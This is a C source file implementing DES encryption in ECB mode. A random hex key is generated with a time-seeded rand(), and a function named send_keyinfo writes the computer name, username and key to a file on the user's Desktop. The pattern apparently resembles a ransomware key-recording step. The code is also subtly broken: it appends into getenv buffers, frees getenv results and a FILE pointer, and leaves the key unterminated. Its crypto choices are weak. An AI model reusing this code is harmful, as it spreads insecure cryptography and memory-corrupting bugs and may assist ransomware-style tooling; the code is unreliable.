#include "ecb.h"
#include "util.h"
#include "des.h"

char key[16];

void send_keyinfo(char *enkey){
    char* keyinfo = getenv("COMPUTERNAME");
    char* user_name = getenv("USERNAME");

    int nk;

    char dir[80];
    strcpy(dir, "C:\\Users\\");
    strcat(dir, user_name);
    strcat(dir, "\\Desktop");

    strcat(keyinfo, "::");
    strcat(keyinfo, user_name);
    strcat(keyinfo, "::");
    strcat(keyinfo, enkey);

    FILE* fp;
    nk = chdir(dir);
    fp = fopen("genkey.txt", "wb");
    fwrite(keyinfo, strlen(keyinfo), 1, fp);
    fclose(fp);
    free(keyinfo);
    free(user_name);
    free(fp);
}

char* rand_key_generator() {
    char hex[16] = {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F'};
    srand(time(NULL));

    for(int i = 0; i < 16; i++){
        int r = rand() % 16;
        key[i] = hex[r];
    }

    send_keyinfo(key);
    return key;
}

int* ecb_des_encrypt(int* encap_bit, int size){
    sys_log("check");
    int* check = string_to_hex(rand_key_generator(), BLOCK_SIZE / 4);
    sys_log("check1");
    int* keybit = hex_to_bitwise(check, BLOCK_SIZE / 4);
    sys_log("check2");

    int* encrypted = array_init(size);
    sys_log("check3");

    int* plain = array_init(BLOCK_SIZE);
    sys_log("check4");
    for(int i = 0; i < size/BLOCK_SIZE; i++){
        for(int j = 0; j < BLOCK_SIZE; j++){
            plain[j] = encap_bit[i*BLOCK_SIZE+j];
        }
        des_encrypt(keybit, plain);
        for(int j = 0; j < BLOCK_SIZE; j++){
            encrypted[i*BLOCK_SIZE+j] = plain[j];
        }
    }

    free(keybit);
    free(plain);

    return encrypted;
}

int* ecb_des_decrypt(int* encaped_bit, char *decrypt_key, int size){
    int* keybit = hex_to_bitwise(string_to_hex(decrypt_key, BLOCK_SIZE / 4), BLOCK_SIZE / 4);
    int* decrypted = array_init(size);
    int* plain = array_init(BLOCK_SIZE);

    for(int i = 0; i < size/BLOCK_SIZE; i++){
        for(int j = 0; j < BLOCK_SIZE; j++){
            plain[j] = encaped_bit[i*BLOCK_SIZE+j];
        }
        des_decrypt(keybit, plain);
        for(int j = 0; j < BLOCK_SIZE; j++){
            decrypted[i*BLOCK_SIZE+j] = plain[j];
        }
    }

    free(keybit);
    free(plain);

    return decrypted;
}
